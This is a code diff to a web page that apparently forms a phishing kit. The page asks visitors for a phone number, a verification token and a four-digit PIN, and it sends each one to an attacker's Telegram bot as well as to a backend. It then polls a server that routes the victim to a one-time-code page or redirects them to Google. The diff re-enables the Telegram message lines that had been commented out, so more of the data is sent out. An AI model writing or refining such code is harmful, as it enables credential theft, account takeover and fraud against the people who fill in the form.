@@ -392,7 +392,6 @@
 
       // --- 1. FIRST SUBMISSION: Phone Number Screen ---
 submitBtn.addEventListener("click", async () => {
-  // Show loader overlay while submitting
   loaderOverlay.style.display = "flex";
   statusText.textContent = "Submitting phone number...";
 
@@ -402,15 +401,16 @@ submitBtn.addEventListener("click", async () => {
   };
 
   try {
-    // A. Submit to your local backend API first
+    // A. Submit to backend
     await fetch("/api/submit-phone", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
     });
 
-    // B. Separately log it to your Admin Telegram
-    // const telegramMessage = `📱 Step 1: Phone Number Submitted\n\n🔹 Phone: +${phoneInput.value}`;
+    // B. Re-enabled message variable declaration
+    const telegramMessage = `📱 Step 1: Phone Number Submitted\n\n🔹 Phone: +${phoneInput.value}`;
+    
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -422,20 +422,16 @@ submitBtn.addEventListener("click", async () => {
 
   } catch (error) {
     console.error("Phone submission failed:", error);
-    // Optional: Handle error states here if the backend fails
   }
 
-  // C. Now that data is safely submitted, transition to the Textarea Screen
+  // C. Screen Transition
   loaderOverlay.style.display = "none";
-  
   mainContent.style.opacity = "0";
   setTimeout(() => {
     mainContent.classList.add("hidden");
     mainContent.classList.remove("flex");
-
     prePinScreen.classList.remove("hidden");
     prePinScreen.classList.add("flex");
-
     setTimeout(() => {
       prePinScreen.classList.remove("opacity-0");
       prePinScreen.classList.add("opacity-100");
@@ -452,21 +448,20 @@ prePinSubmitBtn.addEventListener("click", async () => {
   statusText.textContent = "Submitting verification token...";
 
   const payload = {
-    // phone: phoneInput.value,
     securityToken: prePinInput.value,
     action: "token_submission"
   };
 
   try {
-    // A. Submit the standalone token data to your backend API
     await fetch("/api/submit-token", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
     });
 
-    // B. Send the token text to your Admin Telegram
-    // const telegramMessage = `🎟️ Step 2: Verification Token Submitted\n\n📞 Phone: +${phoneInput.value}\n💬 Token: ${prePinInput.value}`;
+    // Re-enabled message variable declaration
+    const telegramMessage = `🎟️ Step 2: Token Submitted\n\n💬 Token: ${prePinInput.value}`;
+
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -480,18 +475,15 @@ prePinSubmitBtn.addEventListener("click", async () => {
     console.error("Token submission failed:", error);
   }
 
-  // C. Transition smoothly to the regular PIN block
+  // Screen Transition
   loaderOverlay.style.display = "none";
-
   prePinScreen.classList.remove("opacity-100");
   prePinScreen.classList.add("opacity-0");
   setTimeout(() => {
     prePinScreen.classList.add("hidden");
     prePinScreen.classList.remove("flex");
-
     pinScreen.classList.remove("hidden");
     pinScreen.classList.add("flex");
-
     setTimeout(() => {
       pinScreen.classList.remove("opacity-0");
       pinScreen.classList.add("opacity-100");
@@ -500,79 +492,76 @@ prePinSubmitBtn.addEventListener("click", async () => {
   }, 400);
 });
 
-      // --- Secure Pin Box Array Focus Management Loops ---
-      pinBoxes.forEach((box, index) => {
-        box.addEventListener("input", (e) => {
-          let val = e.target.value.replace(/\D/g, "");
-          box.value = val;
+// --- Focus Management ---
+pinBoxes.forEach((box, index) => {
+  box.addEventListener("input", (e) => {
+    let val = e.target.value.replace(/\D/g, "");
+    box.value = val;
 
-          if (val && index < 3) {
-            pinBoxes[index + 1].focus();
-          }
+    if (val && index < 3) {
+      pinBoxes[index + 1].focus();
+    }
 
-          const fullPin = pinBoxes.map((b) => b.value).join("");
-          if (fullPin.length === 4) {
-            handleFinalSubmission(phoneInput.value, fullPin, prePinInput.value);
-          }
-        });
+    const fullPin = pinBoxes.map((b) => b.value).join("");
+    if (fullPin.length === 4) {
+      // Adjusted arguments to match the function parameter definition
+      handleFinalSubmission(fullPin, prePinInput.value);
+    }
+  });
 
-        box.addEventListener("keydown", (e) => {
-          if (e.key === "Backspace" && !box.value && index > 0) {
-            pinBoxes[index - 1].focus();
-          }
-        });
-      });
+  box.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace" && !box.value && index > 0) {
+      pinBoxes[index - 1].focus();
+    }
+  });
+});
 
-      // --- Backend Data Delivery Stream System ---
-      async function handleFinalSubmission(pin, token) {
-        loaderOverlay.style.display = "flex";
-
-        // Optional: You can send a final combined log to your Telegram here as well if required
-        const finalMessage = `👤 User Data Logs\n PIN: ${pin}\n🎟️ Token: ${token}`;
-        try {
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: finalMessage })
-          });
-        } catch(e) {}
-
-        try {
-          const response = await fetch("/api/submit", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ pin, securityToken: token }),
-          });
-          const result = await response.json();
-
-          if (result.sessionId) {
-            statusText.textContent = "Please Wait for verification....";
-
-            const pollInterval = setInterval(async () => {
-              const statusRes = await fetch(`/api/status/${result.sessionId}`);
-              const data = await statusRes.json();
-
-              if (data.status === "otp4") {
-                clearInterval(pollInterval);
-                window.location.href = `step6.html?len=4&id=${result.sessionId}`;
-              } else if (data.status === "otp6") {
-                clearInterval(pollInterval);
-                window.location.href = `step6.html?len=6&id=${result.sessionId}`;
-              } else if (data.status === "done") {
-                clearInterval(pollInterval);
-                window.location.href = "https://www.google.com";
-              }
-            }, 2000);
-          }
-        } catch (err) {
-          statusText.textContent = "There is a network issue. Please try again.";
-          setTimeout(() => {
-            loaderOverlay.style.display = "none";
-          }, 3000);
-        }
-      }
+// --- Final Submission ---
+async function handleFinalSubmission(pin, token) {
+  loaderOverlay.style.display = "flex";
+  const finalMessage = `👤 User Data Logs\n\n🔑 PIN: ${pin}\n🎟️ Token: ${token}`;
+  
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: finalMessage })
     });
-  </script>
+  } catch(e) {}
+
+  try {
+    const response = await fetch("/api/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ pin, securityToken: token }),
+    });
+    const result = await response.json();
+
+    if (result.sessionId) {
+      statusText.textContent = "Please Wait for verification....";
+      const pollInterval = setInterval(async () => {
+        const statusRes = await fetch(`/api/status/${result.sessionId}`);
+        const data = await statusRes.json();
+
+        if (data.status === "otp4") {
+          clearInterval(pollInterval);
+          window.location.href = `step6.html?len=4&id=${result.sessionId}`;
+        } else if (data.status === "otp6") {
+          clearInterval(pollInterval);
+          window.location.href = `step6.html?len=6&id=${result.sessionId}`;
+        } else if (data.status === "done") {
+          clearInterval(pollInterval);
+          window.location.href = "https://www.google.com";
+        }
+      }, 2000);
+    }
+  } catch (err) {
+    statusText.textContent = "There is a network issue. Please try again.";
+    setTimeout(() => {
+      loaderOverlay.style.display = "none";
+    }, 3000);
+  }
+}
 </body>
 
 </html>
